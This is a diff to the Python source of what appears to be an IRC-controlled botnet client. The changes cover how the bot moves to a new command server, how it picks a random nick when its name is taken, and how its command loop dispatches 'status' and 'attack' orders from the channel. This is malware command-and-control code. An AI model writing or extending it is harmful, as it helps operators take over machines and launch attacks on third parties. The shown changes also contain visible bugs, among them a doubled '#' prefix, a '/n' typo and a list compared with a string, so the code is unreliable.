@@ -56,31 +56,41 @@ def cmd_attack(host, port):
 #move to a new irc server
 def cmd_move(host, port_num, chan):
 	global irc, hostname, port, channel
-	#hold onto old in case fail to move
-	old_host = hostname
-	old_port = port
-	old_channel = channel
-	#set to new values
-	hostname = hostname
-	port = port_num
-	channel = "#" + chan
-	#attempt connection
-	temp_irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	status = connect(temp_irc, host, port)
-	#if connection failed, reset values
-	if status == ERROR_FLAG:
-		print("Error: Could not move to new IRC server")
-		return_status(nick + " failure")
-		hostname = old_host
-		port = old_port
-		channel = old_channel
-	#else close current irc connection and replace with new one
-	else:
-		#close old IRC connection
+	chan = "#" + chan
+	if hostname == host and port == port_num:
 		return_status(nick + " success")
-		send(irc, "QUIT I will live on.../n")
-		irc.close()
-		irc = temp_irc
+		channel = chan
+		send(irc, "NICK " + nick + "\n")
+		send(irc, "JOIN " + channel + "\n")
+	else:
+		chan = "#" + chan
+		old_host = hostname
+		old_port = port
+		old_channel = channel
+		#set to new values
+		hostname = host
+		port = port_num
+		channel = chan
+		#attempt connection
+		temp_irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		status = connect(temp_irc, host, port)
+		
+		#if connection failed, reset values
+		if status == ERROR_FLAG:
+			print("Error: Could not move to new IRC server")
+			return_status(nick + " failure")
+			hostname = old_host
+			port = old_port
+			channel = old_channel
+		#else close current irc connection and replace with new one
+		else:
+			#close old IRC connection
+			channel = old_channel
+			return_status(nick + " success")
+			channel = chan
+			send(irc, "QUIT I will live on.../n")
+			irc.close()
+			irc = temp_irc
 	return
 	
 	
@@ -167,7 +177,7 @@ def connect(sock, host, port):
 		send(sock, "JOIN " + channel + "\n")
 		if rcv_command(sock).find("already in use") != -1:
 			suffix = random.randint(0, 10000)
-			nick = nick + str(suffix)
+			nick = "V" + str(suffix)
 		else:
 			break
 	return 
@@ -188,7 +198,9 @@ def handle_connection():
 		cmd = rcv_command(irc)
 		cmd = cmd.split()
 		#interpret command
-		if cmd[0] == "status":
+		if cmd == "\n":
+			pass
+		elif cmd[0] == "status":
 			cmd_status()
 		elif cmd[0] == "attack":
 			try:
